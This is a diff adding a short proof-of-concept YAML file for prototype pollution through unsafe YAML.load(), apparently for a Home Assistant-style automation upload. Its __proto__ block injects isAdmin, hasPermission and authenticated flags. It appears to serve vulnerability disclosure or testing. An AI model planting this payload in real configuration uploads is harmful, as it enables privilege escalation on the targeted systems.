@@ -1,0 +1,29 @@
+# Malicious YAML for Prototype Pollution PoC
+# 
+# This file demonstrates how an attacker could exploit
+# unsafe YAML.load() to pollute JavaScript prototypes
+
+__proto__:
+  polluted: "Successfully exploited via YAML injection"
+  isAdmin: true
+  hasPermission: true
+  authenticated: true
+
+alias: "Prototype Pollution PoC"
+id: "exploit_prototype_pollution"
+
+trigger:
+  - platform: state
+    entity_id: light.test_light
+    to: "on"
+
+condition:
+  - condition: state
+    entity_id: sun.sun
+    state: "below_horizon"
+
+action:
+  - service: notify.notify
+    data:
+      message: "This automation was created via malicious YAML upload"
+      title: "Security PoC"
